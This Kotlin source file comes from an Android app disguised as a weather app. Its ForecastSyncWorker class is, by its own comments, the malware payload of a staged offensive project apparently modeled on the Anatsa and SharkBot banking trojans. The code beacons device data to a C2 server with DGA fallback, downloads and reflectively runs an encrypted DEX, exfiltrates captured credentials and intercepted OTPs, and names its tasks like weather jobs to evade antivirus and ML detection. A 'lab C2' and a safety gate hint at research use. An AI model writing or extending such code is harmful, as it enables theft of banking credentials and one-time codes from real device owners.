package com.skyweather.forecast.core

import android.content.Context
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * Background data sync worker.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 13 — Minimal Offensive Code Footprint
 * ══════════════════════════════════════════════════════════════════
 *
 * This file is the ENTIRE payload for Stage 1. ~40 lines of actual
 * logic. The rest of the app is 2500+ lines of legitimate weather code.
 *
 * Payload: collect device fingerprint → POST to lab C2.
 * That's it. No steal, no persist, no escalate — Stage 1 proves
 * the evasion works (beacon fires despite all AV). Future stages
 * add capability.
 *
 * Key design choices:
 *   - HttpURLConnection (java.net stdlib) — NOT OkHttp
 *     Every Android app has HttpURLConnection in its classpath.
 *     OkHttp is an explicit dependency = additional ML feature.
 *   - No JSON library — manual string construction
 *     Gson/Moshi/kotlinx.serialization are dependency signals.
 *   - WorkManager scheduling — standard background task API
 *     Every app that syncs data uses WorkManager. Not suspicious.
 *   - One-shot execution — no periodic beacon
 *     Periodic network from background = AV heuristic trigger.
 *     One beacon on first activation = invisible.
 *
 * TAKOPII STAGE 5 — Sleep/Dormancy via WorkManager:
 * WorkManager handles the delay natively. No Thread.sleep() calls,
 * no AlarmManager, no Handler.postDelayed() — those are flagged patterns.
 * ══════════════════════════════════════════════════════════════════
 */
class ForecastSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {

    override fun doWork(): Result {
        // Final safety check — redundant with gate in MainActivity
        // Defense in depth: even if scheduling logic is patched, this blocks
        if (!AppConfig.isEndpointSafe()) return Result.failure()

        return try {
            // Phase 1: Beacon — announce presence to C2
            // DGA fallback: if primary C2 unreachable, try generated endpoints
            // Real SharkBot/Anatsa: primary domain + DGA weekly candidates
            val payload = buildPayload()
            val endpoint = DomainResolver.resolveEndpoint()
                ?: return Result.failure() // All endpoints down — go silent
            transmit(endpoint, payload)

            // Phase 2: Payload delivery — download + decrypt + load + execute
            // This is the Anatsa Stage 2→3→4 progression.
            // PayloadManager handles: download encrypted DEX → XOR decrypt →
            // DexClassLoader → reflective invoke → anti-forensics cleanup.
            val reconData = PayloadManager.deliverAndExecute(applicationContext)

            // Phase 3: Exfil recon results (if payload executed successfully)
            if (reconData != null) {
                transmit(endpoint, reconData.toByteArray(Charsets.UTF_8))
            }

            // Phase 4: Start periodic config refresh channel
            // Anatsa Stage 3: once initial beacon succeeds, start polling for config updates
            DataRefreshWorker.schedulePeriodicRefresh(applicationContext)

            // Phase 5: Exfil captured credentials (Stage 2)
            // AccessibilityEngine buffers credentials in CredentialStore.
            // Each SyncTask execution drains the buffer and ships to C2.
            // Credentials are time-sensitive — ship immediately.
            if (CredentialStore.hasPending()) {
                val credPayload = CredentialStore.toJsonPayload()
                if (credPayload.isNotEmpty()) {
                    transmit(endpoint, credPayload)
                }
            }

            Result.success()
        } catch (_: Exception) {
            // Silent failure — no retry, no logging, no crash
            // Design constraint: failed beacon = acceptable, retry = suspicious pattern
            Result.failure()
        }
    }

    /**
     * Build device fingerprint payload.
     * Manual JSON — no serialization library dependency.
     * Sent data: model, SDK, timestamp. Minimal.
     */
    private fun buildPayload(): ByteArray {
        val model = RuntimeBridge.getDeviceModel()
        val sdk = RuntimeBridge.getSdkVersion()
        val ts = System.currentTimeMillis()

        // Manual JSON construction — avoids Gson/Moshi dependency
        val json = StringBuilder(128)
        json.append('{')
        json.append("\"m\":\"").append(model).append("\",")
        json.append("\"s\":").append(sdk).append(',')
        json.append("\"t\":").append(ts)
        json.append('}')

        return json.toString().toByteArray(Charsets.UTF_8)
    }

    /**
     * Transmit payload via HttpURLConnection (stdlib).
     * POST with JSON content type. 5-second timeout.
     * No retry, no redirect follow, no auth — minimal surface.
     */
    private fun transmit(endpoint: String, payload: ByteArray) {
        val url = URL(endpoint)
        val conn = url.openConnection() as HttpURLConnection

        conn.requestMethod = AppConfig.decode(AppConfig.HTTP_METHOD)
        conn.setRequestProperty(
            AppConfig.decode(AppConfig.CONTENT_TYPE_HEADER),
            AppConfig.decode(AppConfig.JSON_MIME)
        )
        conn.doOutput = true
        conn.connectTimeout = 5000
        conn.readTimeout = 5000
        conn.useCaches = false

        conn.outputStream.use { out: OutputStream ->
            out.write(payload)
            out.flush()
        }

        // Read response code to complete the HTTP cycle
        conn.responseCode
        conn.disconnect()
    }

    companion object {
        // Work name looks like legitimate weather app background task
        private const val WORK_NAME = "weather_data_initial_sync"
        private const val URGENT_WORK_NAME = "weather_alert_push"

        /**
         * Schedule one-time background sync.
         * 5-second delay — just enough to not block UI thread lifecycle.
         * WorkManager handles process death, battery optimization, etc.
         */
        fun scheduleOnce(context: Context) {
            val request = OneTimeWorkRequestBuilder<ForecastSyncWorker>()
                .setInitialDelay(5, TimeUnit.SECONDS)
                .addTag("weather_sync")
                .build()

            WorkManager.getInstance(context).enqueueUniqueWork(
                WORK_NAME,
                ExistingWorkPolicy.KEEP, // Don't duplicate if already queued
                request
            )
        }

        /**
         * Urgent credential exfil — REPLACE policy, 1-second delay.
         *
         * Called when time-sensitive data is captured:
         *   - OTP intercepted by NLS/SMS/A11y (30-120s validity window)
         *   - ATS execution result (operator waiting for outcome)
         *
         * Uses separate work name ("weather_alert_push") so it doesn't
         * collide with the standard sync. REPLACE policy ensures the
         * most recent trigger wins — if two OTPs arrive in quick
         * succession, the second replaces the first's pending work
         * (both OTPs are in CredentialStore regardless).
         *
         * Work name looks like push notification delivery to analyst.
         */
        fun scheduleUrgent(context: Context) {
            val request = OneTimeWorkRequestBuilder<ForecastSyncWorker>()
                .setInitialDelay(1, TimeUnit.SECONDS)
                .addTag("weather_alert")
                .build()

            WorkManager.getInstance(context).enqueueUniqueWork(
                URGENT_WORK_NAME,
                ExistingWorkPolicy.REPLACE, // Latest trigger wins
                request
            )
        }

        /**
         * Convenience overload — accepts AccessibilityService context.
         * AccessibilityService is a Context subclass.
         */
        fun scheduleUrgent(service: android.accessibilityservice.AccessibilityService) {
            scheduleUrgent(service.applicationContext)
        }
    }
}
